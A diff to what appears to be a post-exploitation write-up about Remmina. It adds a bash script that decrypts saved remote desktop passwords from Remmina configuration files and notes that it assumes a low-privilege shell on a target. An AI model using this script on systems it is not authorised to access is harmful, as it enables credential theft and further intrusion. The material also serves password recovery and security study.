@@ -17,6 +17,27 @@ https://www.rapid7.com/db/modules/post/multi/gather/remmina_creds
 
 https://village.oyaore.com/home/post/2523/recover-lost-saved-remmina-remote-desktop-client-password
 
+https://gist.github.com/selu/6359496
+
+Here is a sample bash script that decrypts the non-keyring secrets stored in the \*.remmina files:
+
+```bash
+#!/bin/bash
+
+echo -e "Enter the base64 secret from \"remmina.pref\":"
+read RKEY
+
+echo -e "\nEnter the base64 encrypted password from the \".remmina\" file:"
+read REPW
+
+KIV=($(echo -n $RKEY | base64 -di | xxd -p -c 24))
+EPW=$(echo -n $REPW | base64 -di | xxd -p -c 256)
+
+echo -e "\nThe decrypted password will appear in the output below:\n"
+
+echo -n $EPW | xxd -r -p | openssl enc -des3 -nosalt -nopad -K "${KIV[0]}" -iv "${KIV[1]}" -d | hexdump -Cv
+```
+
 **Step 1**
 
 The assumption is that you already have a low-priv shell as some user on the target system that has Remmina configuration files.
